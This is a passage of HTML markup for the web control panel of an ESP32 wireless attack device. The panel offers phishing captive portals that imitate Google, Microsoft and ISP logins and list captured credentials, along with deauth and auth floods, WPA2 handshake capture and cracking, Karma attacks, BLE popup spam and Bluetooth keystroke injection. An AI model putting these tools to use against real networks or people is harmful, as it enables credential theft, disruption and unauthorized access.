      <b style="color:var(--red)">Apocalypse</b> floods with "404 WiFi Not Found", "Loading...", "Error: No Signal" -- makes every phone look broken.
    </div>
  </div>

  <!-- Beacon Spam List -->
  <div class="card">
    <div class="card-title" style="color:var(--red)">&#128225; BEACON SPAM -- CUSTOM LIST <span style="color:var(--green);font-size:.7rem;font-weight:normal">(works)</span></div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:8px">Broadcasts your SSIDs as fake networks across all 13 channels continuously.</div>
    <textarea id="bsl-ssids" rows="3" style="width:100%;background:var(--panel2);border:1px solid var(--border);color:var(--txt);border-radius:8px;padding:8px;font-family:inherit;font-size:.82rem;resize:vertical" placeholder="One SSID per line&#10;HomeNetwork&#10;Free WiFi&#10;iPhone Hotspot"></textarea>
    <div style="display:flex;gap:8px;align-items:center;margin-top:8px;flex-wrap:wrap">
      <button class="btn btn-red" id="bsl-btn" onclick="toggleBeaconList()">&#9654; Start</button>
      <span id="bsl-status" style="color:var(--dim);font-size:.78rem"></span>
    </div>
  </div>

  <!-- Beacon Spam Random -->
  <div class="card">
    <div class="card-title" style="color:var(--red)">&#128225; BEACON SPAM -- RANDOM SSIDs <span style="color:var(--green);font-size:.7rem;font-weight:normal">(works)</span></div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:8px">Generates 20 realistic random network names continuously. Runs until stopped.</div>
    <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
      <button class="btn btn-red" id="bsr-btn" onclick="toggleBeaconRandom()">&#9654; Start</button>
      <span id="bsr-status" style="color:var(--dim);font-size:.78rem"></span>
    </div>
  </div>

  <!-- Evil Portal -->
  <div class="card">
    <div class="card-title" style="color:var(--orange)">&#127981; EVIL PORTAL <span style="color:var(--green);font-size:.7rem;font-weight:normal">(works)</span></div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:10px">Creates a fake open WiFi AP with a realistic name (e.g. "Airport_Free_WiFi"). Victims connect and are shown a login page. Admin view at http://192.168.4.1/admin while portal is running.</div>
    <select id="ep-template" style="width:100%;background:var(--panel2);border:1px solid var(--border);color:var(--txt);border-radius:8px;padding:8px;font-family:inherit;font-size:.82rem;margin-bottom:10px">
      <option value="0">Free WiFi (Generic)</option>
      <option value="1">BT / EE Broadband Login</option>
      <option value="2">Sky WiFi Login</option>
      <option value="3">Google Account Sign In</option>
      <option value="4">Microsoft / Outlook Login</option>
      <option value="5">Starbucks Free WiFi</option>
      <option value="6">Hotel Guest WiFi</option>
      <option value="7">Airport Free WiFi</option>
    </select>
    <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:10px">
      <button class="btn btn-orange" id="ep-btn" onclick="toggleEvilPortal()">&#9654; Start</button>
      <span id="ep-status" style="color:var(--dim);font-size:.78rem;align-self:center"></span>
    </div>
    <div id="ep-creds-wrap" style="display:none">
      <div style="color:var(--yellow);font-size:.75rem;font-weight:600;margin-bottom:4px">&#128246; CONNECTED DEVICES (IP + MAC + Browser)</div>
      <div id="ep-conns-list" style="max-height:100px;overflow-y:auto;font-size:.7rem;margin-bottom:10px">
        <div style="color:var(--dim);padding:6px">No connections yet...</div>
      </div>
      <div style="color:var(--accent);font-size:.75rem;font-weight:600;margin-bottom:4px">&#128274; CAPTURED CREDENTIALS</div>
      <div id="ep-creds-list" style="max-height:180px;overflow-y:auto;font-size:.75rem">
        <div style="color:var(--dim);padding:8px">No credentials captured yet...</div>
      </div>
      <button class="btn" onclick="clearEPCreds()" style="margin-top:8px;border-color:var(--red);color:var(--red);font-size:.72rem">&#128465; Clear All</button>
    </div>
  </div>

  <!-- Rick Roll -->
  <div class="card">
    <div class="card-title" style="color:var(--purple)">&#127925; RICK ROLL BEACON <span style="color:var(--green);font-size:.7rem;font-weight:normal">(works)</span></div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:8px">Broadcasts Rick Astley lyrics as SSIDs continuously. Visible to all nearby WiFi scanners.</div>
    <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
      <button class="btn" id="rr-btn" style="background:var(--panel2);border:1px solid var(--purple);color:var(--purple)" onclick="toggleRickRoll()">&#9654; Start</button>
      <span id="rr-status" style="color:var(--dim);font-size:.78rem"></span>
    </div>
  </div>

  <!-- Probe Flood -->
  <div class="card">
    <div class="card-title" style="color:var(--yellow)">&#128246; PROBE REQUEST FLOOD <span style="color:var(--red);font-size:.7rem;font-weight:normal">(doesn't work — no visible effect)</span></div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:8px">Injects fake probe request frames (~100/sec) with random MACs and SSIDs. To verify frames are being sent, use <b style="color:var(--yellow)">Wireshark</b> with a monitor-mode adapter: filter <code style="color:var(--green)">wlan.fc.type_subtype==4</code> to see probe requests.</div>
    <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
      <button class="btn" id="pf-btn" style="background:var(--panel2);border:1px solid var(--yellow);color:var(--yellow)" onclick="toggleProbeFlood()">&#9654; Start</button>
      <span id="pf-status" style="color:var(--dim);font-size:.78rem"></span>
    </div>
  </div>

  <!-- AP Clone Spam -->
  <div class="card">
    <div class="card-title" style="color:var(--red)">&#128225; AP CLONE SPAM <span style="color:var(--yellow);font-size:.7rem;font-weight:normal">(partially works)</span></div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:8px">Scan nearby APs, select which ones to clone, then start. ESP32 beacons fake copies with real BSSIDs.</div>
    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px">
      <button class="btn" id="apc-scan-btn" style="background:var(--panel2);border:1px solid var(--blue);color:var(--blue)" onclick="apCloneScan()">&#128269; Scan</button>
      <button class="btn" style="background:var(--panel2);border:1px solid var(--dim);color:var(--dim);font-size:.78rem" onclick="apcSelectAll()">All</button>
      <button class="btn" style="background:var(--panel2);border:1px solid var(--dim);color:var(--dim);font-size:.78rem" onclick="apcSelectNone()">None</button>
      <button class="btn btn-red" id="apc-btn" onclick="toggleAPClone()">&#9654; Start</button>
      <span id="apc-status" style="color:var(--dim);font-size:.78rem;align-self:center"></span>
    </div>
    <div id="apc-list" style="max-height:200px;overflow-y:auto;font-size:.78rem;display:none">
      <div style="color:var(--dim);padding:8px">Scan to see networks...</div>
    </div>
  </div>

  <!-- Deauth Attack -->
  <div class="card">
    <div class="card-title" style="color:var(--red)">&#9889; DEAUTH ATTACK <span style="color:var(--yellow);font-size:.7rem;font-weight:normal">(partially works — requires arduino-esp32 2.0.17)</span></div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:10px">Sends 802.11 deauth frames to disconnect clients. <b style="color:var(--yellow)">Note:</b> requires arduino-esp32 core 2.0.17 (not 3.x). To verify frames are being sent, use <b style="color:var(--yellow)">Wireshark</b> with a monitor-mode adapter: filter <code style="color:var(--green)">wlan.fc.type_subtype==12</code> to see deauth frames.</div>
    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px">
      <button class="btn btn-scan" onclick="deauthScan()">&#128269; Scan</button>
      <button class="btn btn-red" onclick="deauthAll()">&#9889; All</button>
      <button class="btn btn-red" onclick="deauthSelected()">&#9889; Selected</button>
      <button class="btn" onclick="deauthStop()" style="border-color:var(--dim);color:var(--dim)">&#9632; Stop</button>
    </div>
    <div id="deauth-stats" style="color:var(--dim);font-size:.75rem;margin-bottom:8px"></div>
    <div id="deauth-list" style="max-height:200px;overflow-y:auto;font-size:.75rem">
      <div style="color:var(--dim);padding:8px">Press Scan to find targets</div>
    </div>
  </div>

  <!-- Auth Flood -->
  <div class="card">
    <div class="card-title" style="color:var(--red)">&#128165; AUTH FLOOD <span style="color:var(--yellow);font-size:.7rem;font-weight:normal">(partially works)</span></div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:10px">Floods the target router with fake authentication requests from random MACs. Fills the AP client table causing it to crash or stop accepting connections.</div>
    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px">
      <button class="btn btn-scan" onclick="authFloodScan()">&#128269; Scan</button>
      <button class="btn btn-red" onclick="authFloodAll()">&#128165; Flood All</button>
      <button class="btn btn-red" onclick="authFloodSelected()">&#128165; Selected</button>
      <button class="btn" onclick="authFloodStop()" style="border-color:var(--dim);color:var(--dim)">&#9632; Stop</button>
    </div>
    <div id="auth-stats" style="color:var(--dim);font-size:.75rem;margin-bottom:8px"></div>
    <div id="auth-list" style="max-height:180px;overflow-y:auto;font-size:.75rem">
      <div style="color:var(--dim);padding:8px">Press Scan to find targets</div>
    </div>
  </div>

  <!-- PMKID Capture -->
  <div class="card">
    <div class="card-title" style="color:var(--yellow)">&#128273; PMKID CAPTURE -- WPA2 HASH <span style="color:var(--yellow);font-size:.7rem;font-weight:normal">(partially works)</span></div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:10px">Captures WPA2 EAPOL handshakes when devices connect. <b style="color:var(--yellow)">Known limitation:</b> only captures handshakes from devices connecting to <b>ESP32-Cyber</b> itself — not from other nearby networks. This is because the ESP32 only receives EAPOL frames for its own AP. Download the .hc22000 file and crack offline with hashcat.</div>
    <div style="background:var(--panel2);border:1px solid var(--border);border-radius:8px;padding:10px;margin-bottom:10px;font-size:.75rem;font-family:monospace;color:var(--green)">
      hashcat -m 22000 capture.hc22000 wordlist.txt
    </div>
    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px">
      <button class="btn btn-accent" id="pmkid-btn" onclick="togglePMKID()">&#9654; Start</button>
      <button class="btn btn-scan" onclick="downloadPMKID()" id="pmkid-dl" style="display:none">&#128229; Download .hc22000</button>
    </div>
    <div id="pmkid-stats" style="color:var(--dim);font-size:.75rem;margin-bottom:8px">Idle</div>
    <div id="pmkid-list" style="max-height:160px;overflow-y:auto;font-size:.72rem"></div>
    <!-- Cracker -->
    <div id="crack-wrap" style="margin-top:10px;padding-top:10px;border-top:1px solid var(--border)">
      <div style="color:var(--yellow);font-size:.78rem;font-weight:600;margin-bottom:8px">&#128477; WORDLIST CRACKER</div>
      <div style="color:var(--dim);font-size:.72rem;margin-bottom:8px">Tries 60 common passwords against captured PMKID using real PBKDF2-HMAC-SHA1. Takes ~60s.</div>
      <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px">
        <select id="crack-target" style="flex:1;background:var(--panel2);border:1px solid var(--border);color:var(--txt);border-radius:8px;padding:8px;font-family:inherit;font-size:.8rem">
          <option value="">-- Select captured PMKID --</option>
        </select>
        <button class="btn" id="crack-btn" onclick="startCrack()" style="border-color:var(--yellow);color:var(--yellow)">&#128477; Crack</button>
        <button class="btn" onclick="stopCrack()" style="border-color:var(--dim);color:var(--dim)">&#9632; Stop</button>
      </div>
      <div id="crack-bar-wrap" style="display:none">
        <div style="background:var(--panel2);border-radius:6px;height:14px;overflow:hidden;border:1px solid var(--border);margin-bottom:6px">
          <div id="crack-bar" style="height:100%;width:0%;background:var(--yellow);transition:width .3s"></div>
        </div>
        <div id="crack-status" style="color:var(--dim);font-size:.72rem;font-family:monospace"></div>
      </div>
      <div id="crack-result" style="display:none;padding:12px;background:rgba(0,232,122,.1);border:1px solid var(--green);border-radius:8px;margin-top:8px">
        <div style="color:var(--green);font-weight:700;font-size:.9rem">&#10004; PASSWORD FOUND!</div>
        <div id="crack-found-pass" style="color:var(--txt);font-size:1.1rem;font-family:monospace;font-weight:700;margin-top:4px"></div>
      </div>
      <div id="crack-fail" style="display:none;padding:8px;color:var(--dim);font-size:.75rem;border:1px solid var(--border);border-radius:8px;margin-top:8px">
        Not in wordlist — download .hc22000 and use hashcat on a PC for full crack
      </div>
    </div>
  </div>

  <!-- SSID Confusion Attack -->
  <div class="card">
    <div class="card-title" style="color:var(--yellow)">&#127381; SSID CONFUSION <span style="color:var(--green);font-size:.7rem;font-weight:normal">(works)</span></div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:8px">Scans for nearby APs then floods with dozens of similar-looking SSIDs, making it impossible to identify the real network.</div>
    <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
      <button class="btn btn-red" id="ssid-conf-btn" onclick="toggleSSIDConf()">&#9654; Start</button>
      <span id="ssid-conf-status" style="color:var(--dim);font-size:.78rem"></span>
    </div>
  </div>

  <!-- Karma Attack -->
  <div class="card">
    <div class="card-title" style="color:var(--orange)">&#128520; KARMA ATTACK <span style="color:var(--green);font-size:.7rem;font-weight:normal">(works)</span></div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:8px">Scan nearby APs, pick which ones to respond to, then start. When a device probes for a selected network the ESP32 creates a matching AP and serves a login portal.</div>
    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px">
      <button class="btn" id="karma-scan-btn" style="background:var(--panel2);border:1px solid var(--blue);color:var(--blue)" onclick="karmaScan()">&#128269; Scan</button>
      <button class="btn" style="background:var(--panel2);border:1px solid var(--dim);color:var(--dim);font-size:.78rem" onclick="karmaSelectAll()">All</button>
      <button class="btn" style="background:var(--panel2);border:1px solid var(--dim);color:var(--dim);font-size:.78rem" onclick="karmaSelectNone()">None</button>
      <button class="btn btn-orange" id="karma-btn" onclick="toggleKarma()">&#9654; Start</button>
      <a class="btn" href="/karma-portal" target="_blank" style="border-color:var(--yellow);color:var(--yellow);text-decoration:none;padding:8px 14px;font-size:.82rem">&#128065; Test Portal</a>
      <span id="karma-status" style="color:var(--dim);font-size:.78rem;align-self:center"></span>
    </div>
    <div id="karma-list" style="max-height:180px;overflow-y:auto;font-size:.78rem;margin-bottom:10px;display:none">
      <div style="color:var(--dim);padding:8px">Scan to see networks...</div>
    </div>
    <div id="karma-creds-wrap" style="display:none">
      <div style="color:var(--yellow);font-size:.75rem;font-weight:600;margin-bottom:4px">&#128246; CONNECTED DEVICES</div>
      <div id="karma-conns-list" style="max-height:90px;overflow-y:auto;font-size:.7rem;margin-bottom:10px">
        <div style="color:var(--dim);padding:6px">No connections yet...</div>
      </div>
      <div style="color:var(--txt);font-size:.8rem;font-weight:600;margin-bottom:6px">&#128272; Captured Credentials</div>
      <div style="overflow-x:auto">
        <table style="width:100%;border-collapse:collapse;font-size:.75rem">
          <thead><tr style="color:var(--dim);text-align:left">
            <th style="padding:4px 8px">SSID</th><th style="padding:4px 8px">IP</th>
            <th style="padding:4px 8px">MAC</th><th style="padding:4px 8px">User</th>
            <th style="padding:4px 8px">Pass</th>
          </tr></thead>
          <tbody id="karma-creds-body">
            <tr><td colspan="5" style="color:var(--dim);padding:8px;text-align:center">No credentials yet...</td></tr>
          </tbody>
        </table>
      </div>
    </div>
  </div>


</div>

<!-- BT ATTACKS -->
<div class="screen" id="s-batk">
  <div class="sh"><h2>&#128241; BLUETOOTH ATTACKS</h2></div>

  <!-- AirDrop Spam -->
  <div class="card">
    <div class="card-title" style="color:var(--blue)">&#128247; AIRDROP SPAM <span style="color:var(--yellow);font-size:.7rem;font-weight:normal">(partially works — visible in nRF Connect)</span></div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:10px">Floods nearby iPhones with AirDrop requests. Victims see repeated sharing popups. Works within ~10m.</div>
    <div style="display:flex;gap:8px;align-items:center">
      <button class="btn btn-accent" id="airdrop-btn" onclick="toggleAirdrop()">&#9654; Start</button>
      <span id="airdrop-status" style="color:var(--dim);font-size:.78rem"></span>
    </div>
  </div>

  <!-- Game Controller Spam -->
  <div class="card">
    <div class="card-title" style="color:var(--green)">&#127918; GAME CONTROLLER SPAM <span style="color:var(--red);font-size:.7rem;font-weight:normal">(doesn't show on physical device)</span></div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:10px">Sends fake Bluetooth pairing requests as game controllers. Victims see "Joy-Con", "DualSense", "Xbox Controller" pairing popups.</div>
    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px">
      <button class="btn" onclick="spamController(0)" style="border-color:var(--red);color:var(--red)">&#127918; Joy-Con</button>
      <button class="btn" onclick="spamController(1)" style="border-color:var(--blue);color:var(--blue)">&#127918; PS5 DualSense</button>
      <button class="btn" onclick="spamController(2)" style="border-color:var(--green);color:var(--green)">&#127918; Xbox</button>
      <button class="btn" onclick="stopController()" style="border-color:var(--dim);color:var(--dim)">&#9632; Stop</button>
    </div>
    <div id="controller-status" style="color:var(--dim);font-size:.75rem"></div>
  </div>

  <!-- Tracker Detector -->
  <div class="card">
    <div class="card-title" style="color:var(--yellow)">&#128270; TRACKER DETECTOR <span style="color:var(--red);font-size:.7rem;font-weight:normal">(doesn't show on physical device)</span></div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:10px">Scans for AirTags, Tile, Samsung SmartTag and other hidden Bluetooth trackers nearby. Useful for privacy sweeps.</div>
    <div style="display:flex;gap:8px;margin-bottom:10px">
      <button class="btn btn-scan" onclick="scanTrackers()">&#128270; Scan for Trackers</button>
    </div>
    <div id="tracker-stats" style="color:var(--dim);font-size:.75rem;margin-bottom:6px"></div>
    <div id="tracker-list" style="max-height:200px;overflow-y:auto;font-size:.75rem">
      <div style="color:var(--dim);padding:8px">Press Scan to search for trackers</div>
    </div>
  </div>

  <!-- BLE Name Spoof -->
  <div class="card">
    <div class="card-title" style="color:var(--orange)">&#128268; BLE NAME SPOOF <span style="color:var(--yellow);font-size:.7rem;font-weight:normal">(works — no physical screen display)</span></div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:10px">Advertise as any named Bluetooth device. Nearby devices will see it in their Bluetooth list.</div>
    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px">
      <input id="spoof-name" class="port-input" type="text" placeholder="Device name e.g. AirPods Pro" style="flex:1;min-width:140px"/>
      <select id="spoof-type" style="background:var(--panel2);border:1px solid var(--border);color:var(--txt);border-radius:8px;padding:8px;font-family:inherit;font-size:.82rem">
        <option value="0">Keyboard</option>
        <option value="1">Phone</option>
        <option value="2">Headphones</option>
        <option value="3">Gamepad</option>
        <option value="4">Computer</option>
      </select>
    </div>
    <div style="display:flex;gap:8px">
      <button class="btn btn-accent" onclick="startNameSpoof()">&#9654; Spoof</button>
      <button class="btn" onclick="stopNameSpoof()" style="border-color:var(--dim);color:var(--dim)">&#9632; Stop</button>
      <span id="spoof-status" style="color:var(--dim);font-size:.78rem;align-self:center"></span>
    </div>
  </div>

  <!-- Bad BLE -->
  <div class="card">
    <div class="card-title" style="color:var(--red)">&#9000; BAD BLE -- KEYBOARD INJECTION <span style="color:var(--yellow);font-size:.7rem;font-weight:normal">(works — no physical screen display)</span></div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:10px">
      ESP32 appears as a Bluetooth keyboard. <b style="color:var(--yellow)">How to use:</b>
      <ol style="margin:6px 0 0 16px;line-height:1.9">
        <li>Press <b>Advertise</b> below</li>
        <li>On Windows: Settings → Bluetooth → Add Device → find the keyboard name → Pair</li>
        <li>Wait for Windows to say <b>"Device is ready"</b> (30-60 seconds, multiple connects normal)</li>
        <li>Status bar shows <b>"Connected &amp; ready"</b> — then press Run Payload</li>
      </ol>
    </div>
    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px">
      <input id="ble-devname" class="port-input" type="text" placeholder="Device name e.g. Magic Keyboard" value="Magic Keyboard" style="flex:1;min-width:140px"/>
      <button class="btn btn-accent" id="badble-adv-btn" onclick="toggleBadBLE()">&#128246; Advertise</button>
    </div>
    <div id="badble-status" style="color:var(--green);font-size:.78rem;margin-bottom:10px;font-weight:500">Idle -- press Advertise then pair from target device</div>
    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px">
      <select id="badble-payload" style="background:var(--panel2);border:1px solid var(--border);color:var(--txt);border-radius:8px;padding:8px;flex:1;font-family:inherit;font-size:.82rem">
        <option value="1">Open CMD (Windows)</option>
        <option value="2">Dump WiFi Profiles</option>
        <option value="3">Rick Roll Browser</option>
        <option value="4">Notepad Message</option>
        <option value="5">Open PowerShell</option>
        <option value="0">Custom Script (below)</option>
      </select>
      <button class="btn btn-red" onclick="runBadBLE()" id="badble-run-btn">&#9654; Run</button>
    </div>
    <textarea id="badble-custom" rows="4" style="width:100%;background:var(--panel2);border:1px solid var(--border);color:var(--txt);border-radius:8px;padding:8px;font-family:monospace;font-size:.78rem;resize:vertical;display:none" placeholder="Ducky script e.g:&#10;DELAY 500&#10;GUI r&#10;STRING notepad&#10;ENTER"></textarea>
    <div style="color:var(--dim);font-size:.72rem;margin-top:6px">Target must be paired first. Works on Windows, Mac, Linux, Android.</div>
  </div>

  <!-- BLE Spam -->
  <div class="card">
    <div class="card-title" style="color:var(--purple)">&#128241; BLE SPAM -- iOS <span style="color:var(--yellow);font-size:.7rem;font-weight:normal">(partially works — visible in nRF Connect)</span></div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:8px">Sends fake Apple BLE advertisements -- triggers iOS popup notifications (AirPods, AppleTV setup, Homekit) on nearby iPhones every 200ms.</div>
    <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
      <button class="btn" id="bles-btn" style="background:var(--panel2);border:1px solid var(--purple);color:var(--purple)" onclick="toggleBLESpam()">&#9654; Start</button>
      <span id="bles-status" style="color:var(--dim);font-size:.78rem"></span>
    </div>
  </div>

  <!-- BLE Spam All -->
  <div class="card">
    <div class="card-title" style="color:var(--purple)">&#128241; BLE SPAM -- ALL DEVICES <span style="color:var(--yellow);font-size:.7rem;font-weight:normal">(partially works — visible in nRF Connect)</span></div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:8px">Simultaneously spams iOS (Apple popups), Android (Fast Pair -- JBL/Bose/Pixel Buds), and Windows (Swift Pair). Hits every device type at once.</div>
    <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center">
      <select id="blesa-mode" style="background:var(--panel2);border:1px solid var(--border);color:var(--txt);border-radius:6px;padding:6px 10px;font-family:inherit">
        <option value="3">All Devices</option>
        <option value="0">iOS Only</option>
        <option value="1">Android Only</option>
        <option value="2">Windows Only</option>
      </select>
      <button class="btn" id="blesa-btn" style="background:var(--panel2);border:1px solid var(--purple);color:var(--purple)" onclick="toggleBLESpamAll()">&#9654; Start</button>
      <span id="blesa-status" style="color:var(--dim);font-size:.78rem"></span>
    </div>
  </div>

  <!-- EAPOL Sniffer -->

</div>

<!-- DEFENCE -->
<div class="screen" id="s-defend">
  <div class="sh"><h2>&#128737; DEFENCE TOOLS</h2></div>

  <div class="card">
    <div class="card-title" style="color:var(--green)">&#128272; WPA2 HANDSHAKE SNIFFER <span style="color:var(--yellow);font-size:.7rem;font-weight:normal">(partially works)</span></div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:8px">Passively sniffs for WPA2 EAPOL 4-way handshakes. Use <strong style="color:var(--yellow)">Targeted</strong> to deauth + capture a specific AP — more reliable than passive.</div>
    <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:10px">
      <button class="btn" id="eapol-btn" style="background:rgba(0,232,122,.08);border:1px solid var(--green);color:var(--green)" onclick="toggleEapol()">&#9654; Start</button>
      <select id="eapol-ch" onchange="setEapolChannel(this.value)"
        style="background:var(--panel2);border:1px solid var(--border);color:var(--txt);border-radius:8px;padding:6px 8px;font-family:inherit;font-size:.78rem">
        <option value="0">&#128257; All ch (hop)</option>
        <option value="1">Lock ch 1</option><option value="2">Lock ch 2</option>
        <option value="3">Lock ch 3</option><option value="4">Lock ch 4</option>
        <option value="5">Lock ch 5</option><option value="6">Lock ch 6</option>
        <option value="7">Lock ch 7</option><option value="8">Lock ch 8</option>
        <option value="9">Lock ch 9</option><option value="10">Lock ch 10</option>
        <option value="11">Lock ch 11</option><option value="12">Lock ch 12</option>
        <option value="13">Lock ch 13</option>
      </select>
      <span id="eapol-status" style="color:var(--dim);font-size:.78rem"></span>
    </div>
    <!-- Targeted capture - pick from WiFi scan results -->
    <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:8px">
      <select id="eapol-target-sel"
        style="flex:1;background:var(--panel2);border:1px solid var(--border);color:var(--txt);
               border-radius:8px;padding:6px 8px;font-family:inherit;font-size:.78rem">
        <option value="">-- Scan WiFi first, then select target --</option>
      </select>
      <button class="btn" onclick="eapolTargeted()"
        style="border-color:var(--yellow);color:var(--yellow);font-size:.78rem;white-space:nowrap">
        &#9889; Targeted</button>
    </div>
    <div id="eapol-targeted-status" style="color:var(--yellow);font-size:.75rem;display:none;margin-bottom:8px">
      Deauthing target... web UI offline ~8s
    </div>
    <div id="eapol-list" style="max-height:200px;overflow-y:auto;font-size:.75rem;display:none">
      <div style="color:var(--dim);padding:8px">No handshakes captured yet...</div>
    </div>
  </div>

  <!-- Pineapple Detector -->
  <div class="card">
    <div class="card-title" style="color:var(--green)">&#128250; ROGUE AP DETECTOR <span style="color:var(--red);font-size:.7rem;font-weight:normal">(doesn't work)</span></div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:10px">Scans for Evil Twin attacks, WiFi Pineapples, and suspicious APs every 15 seconds. Detects duplicate SSIDs, known Pineapple names, and unusually strong signals.</div>
    <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-bottom:10px">
      <button class="btn btn-scan" id="pine-btn" onclick="togglePineapple()">&#9654; Start Scanning</button>
      <span id="pine-status" style="color:var(--dim);font-size:.78rem"></span>
    </div>
    <div id="pine-list" style="display:none;max-height:200px;overflow-y:auto;font-size:.75rem">
      <div style="color:var(--dim);padding:8px">No suspicious APs detected yet...</div>
    </div>
  </div>

  <!-- Chromecast Attack -->
  <div class="card">
    <div class="card-title" style="color:var(--red)">&#127910; CHROMECAST ATTACK <span style="color:var(--red);font-size:.7rem;font-weight:normal">(doesn't work)</span></div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:10px">Discovers Google Cast devices (Chromecast, Roku) on the local network via SSDP and casts a YouTube video to them. Must be connected to same WiFi.</div>
    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px">
      <button class="btn btn-accent" id="cc-scan-btn" onclick="ccScan()">&#128269; Discover</button>
      <button class="btn btn-red" id="cc-rickroll-btn" onclick="ccRickRoll()" style="display:none">&#127925; Rick Roll All</button>
      <span id="cc-status" style="color:var(--dim);font-size:.78rem;align-self:center"></span>
    </div>
    <div id="cc-list" style="display:none;font-size:.78rem"></div>
  </div>
</div>

<!-- SETTINGS -->
<!-- WARDRIVING -->
<div class="screen" id="s-wardrive">
  <div class="sh"><h2>&#128205; WARDRIVING <span style="color:var(--green);font-size:.7rem;font-weight:normal">(works — physical screen display pending)</span></h2></div>
  <!-- Signal strength chart -->
  <div class="card">
    <div class="card-title">&#128268; SIGNAL STRENGTH MAP</div>
    <div id="wd-chart" style="min-height:80px;display:flex;align-items:flex-end;gap:3px;padding:8px 0;overflow-x:auto"></div>
    <div style="color:var(--dim);font-size:.7rem;margin-top:4px">Live signal strength — updates while wardriving</div>
  </div>

  <div class="card">
    <div class="card-title">&#128205; PASSIVE AP LOGGER</div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:10px">Continuously scans and logs every AP nearby. Walk around to map local networks. Survives reboots via flash storage.</div>
    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px">
      <button class="btn btn-accent" id="wd-btn" onclick="toggleWardrive()">&#9654; Start</button>
      <button class="btn" onclick="clearWardrive()" style="border-color:var(--dim);color:var(--dim)">&#128465; Clear</button>
      <button class="btn btn-scan" onclick="exportWardrive()">&#128229; Export CSV</button>
    </div>
    <div id="wd-stats" style="color:var(--dim);font-size:.75rem;margin-bottom:8px">Press Start to begin</div>
    <div style="display:flex;gap:4px;font-size:.68rem;color:var(--dim);margin-bottom:4px;padding:3px 6px;background:var(--panel2);border-radius:4px">
      <span style="flex:2">SSID</span><span style="flex:1.2">BSSID</span>
      <span style="flex:.4">CH</span><span style="flex:.6">ENC</span>
      <span style="flex:.5">dBm</span><span style="flex:.4">x</span>
    </div>
    <div id="wd-list" style="max-height:340px;overflow-y:auto;font-size:.7rem">
      <div style="color:var(--dim);padding:8px">No APs logged yet</div>
    </div>
  </div>
</div>

<!-- LOGS -->
<div class="screen" id="s-logs">
  <div class="sh">
    <h2>&#128196; ACTIVITY LOGS</h2>
    <div style="display:flex;gap:8px">
      <button class="btn btn-accent" onclick="exportLogs()" style="font-size:.72rem">&#128229; Export CSV</button>
      <button class="btn btn-red"    onclick="clearLogs()"  style="font-size:.72rem">&#128465; Clear</button>
    </div>
  </div>
  <div id="log-count" style="color:var(--dim);font-size:.75rem;margin-bottom:10px">0 events</div>
  <div id="log-list" style="max-height:70vh;overflow-y:auto;font-size:.75rem;font-family:monospace">
    <div style="color:var(--dim);padding:12px;text-align:center">No events yet -- run an attack or scan to see logs here</div>
  </div>
</div>

<div class="screen" id="s-settings">
  <div class="sh"><h2>&#9881; SETTINGS</h2></div>
  <div class="card">
    <div class="card-title">HOTSPOT</div>
    <div class="settings-row"><span class="sk">SSID</span>       <span class="sv2" style="color:var(--accent)">ESP32-Cyber</span></div>
    <div class="settings-row"><span class="sk">Password</span>   <span class="sv2" style="color:var(--green)">esp32cyber</span></div>
    <div class="settings-row"><span class="sk">IP Address</span> <span class="sv2" style="color:var(--green)">192.168.4.1</span></div>
  </div>
  <!-- Web UI Password -->
  <div class="card">
    <div class="card-title">&#128274; WEB UI PIN LOCK</div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:10px">Set a 4-digit PIN to protect the web UI. Leave blank and press Set to disable.</div>
    <div style="display:flex;gap:8px;margin-bottom:8px">
      <input type="password" id="webpin-new" placeholder="New 4-digit PIN" maxlength="4" pattern="[0-9]*" inputmode="numeric"
        style="background:var(--panel2);border:1px solid var(--border);border-radius:8px;color:var(--txt);padding:8px 12px;font-family:inherit;font-size:.85rem;flex:1">
      <button class="btn btn-accent" onclick="setWebPin()">Set PIN</button>
    </div>
    <div id="webpin-status" style="font-size:.75rem;color:var(--dim)"></div>
  </div>

  <div class="card">
